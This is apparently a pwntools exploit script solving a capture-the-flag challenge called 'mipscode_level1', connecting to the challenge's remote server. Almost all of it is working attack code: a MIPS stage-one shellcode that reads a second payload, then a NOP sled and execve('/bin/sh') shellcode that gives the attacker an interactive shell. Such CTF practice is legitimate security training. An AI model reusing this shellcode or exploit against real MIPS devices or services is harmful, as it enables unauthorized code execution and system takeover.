from pwn import *
from icecream import ic

elf = exe = ELF("./mipscode_level1")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("mipscode-level1.chal.cyberjousting.com", 1356)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

readcode = asm('''
        li $v0, 4003
        slti $a0, $0, -1
        lw $a1, 32($sp)
        li $a2, 0x1000
        syscall 0x40405
        ''')

mipscode = asm("nop")*50
mipscode += asm('''
        lui $t7, 0x6e69
        ori $t7, 0x622f
        lui $t6, 0x0068
        ori $t6, 0x732f
        slti $a1, $0, -1
        slti $a2, $0, -1
        sw $t7, 0($sp)
        sw $t6, 4($sp)
        move $a0, $sp
        li $v0, 4011
        syscall 0x040405
        ''')

sla(b'Shellcode>',readcode)
sl(mipscode)
i()
